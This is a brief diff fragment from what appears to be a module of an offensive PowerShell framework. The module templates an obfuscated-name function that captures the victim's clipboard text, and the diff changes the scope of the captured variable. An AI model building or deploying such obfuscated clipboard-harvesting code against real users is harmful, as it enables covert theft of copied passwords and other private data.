@@ -14,7 +14,7 @@ class ExportClipboard:
 function {{ ron.obf_get_clipboard }}() {
     $b = "Text"
     $a = Get-Clipboard -Format $b
-    if ($a -ne $null ){$Script:tr = $a}
-    else {$Script:tr = "2"}
+    if ($a -ne $null ){$global:tr = $a}
+    else {$global:tr = "2"}
 }'''
         return var
